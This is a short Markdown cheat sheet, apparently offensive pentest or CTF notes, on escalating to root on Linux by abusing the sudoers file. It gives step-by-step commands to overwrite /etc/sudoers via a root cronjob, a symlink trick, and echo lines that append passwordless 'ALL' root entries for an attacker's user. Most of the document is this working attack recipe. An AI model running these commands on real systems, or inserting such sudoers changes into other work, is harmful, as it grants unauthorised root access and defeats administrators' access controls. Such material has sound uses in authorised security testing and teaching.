# Sudoers file

### Use cases:

### If a cronjob running as root exists that can overwrite a file within the file system, one file we can abuse is the sudoers file.

#### STEPS:

#### 1) Attacking machine: 

    sudo cp /etc/sudoers .

#### 2) Attacking machine: Give the current user you already owned sudo privileges for all commands like:

    USER  ALL=(ALL:ALL) ALL

#### or

    USER ALL=(ALL:ALL) NOPASSWD:ALL

#### 3) According to the cronjob at the time, use it to transfer the sudoers file from the attacking machine to the target machine, overwriting the target's /etc/sudoers file with your own modified file.

#### 4) 

    sudo su

#### 5) PROFIT!

### Alternate method to exploit this: symlinks

#### Command:

    ln -s /etc/sudoers /home/USER/sudoers

### Then, if there is a misconfiguration that enables our user to give permissions to arbitrary files, then we can edit the sudoers file to give our user rights to execute ANYTHING without password as root via sudo

## Writeable /etc/sudoers example

    echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
    
    # use SUDO without password
    echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
    echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
